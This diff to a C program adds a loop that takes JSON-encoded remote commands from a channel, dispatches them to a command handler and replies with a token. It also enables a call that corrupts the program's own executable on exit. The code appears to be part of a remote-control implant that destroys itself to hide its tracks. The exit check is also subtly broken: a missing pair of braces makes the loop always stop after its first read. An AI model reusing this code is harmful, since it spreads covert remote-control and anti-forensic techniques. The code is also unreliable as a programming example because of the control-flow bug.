@@ -24,17 +24,36 @@
 
 #define _GNU_SOURCE
 
+#include <string.h>
 #include <stdlib.h>
-#include <stdio.h>
 
 #include "json.h"
 #include "utils.h"
 #include "base64.h"
 
-#include "console.h"
 #include "channel.h"
+#include "handler.h"
 
 char data[64] = ":data:string:";
+
+void interact(int channel)
+{
+    while (1) {
+        char *input = read_channel(channel);
+        JSONObject *json = parseJSON(input);
+
+        char *cmd = find_json(json, "cmd");
+        char *args = find_json(json, "args");
+        char *token = find_json(json, "token");
+
+        if (strcmp(cmd, "exit") == 0)
+            send_channel(channel, token);
+            break;
+
+        handle_command(channel, cmd, args);
+        send_channel(channel, token);
+    }
+}
 
 int main(int argc, char *argv[])
 {
@@ -53,6 +72,6 @@ int main(int argc, char *argv[])
     interact(channel);
     close_channel(channel);
 
-    //self_corrupt(argv[0]);
+    self_corrupt(argv[0]);
     return 0;
 }
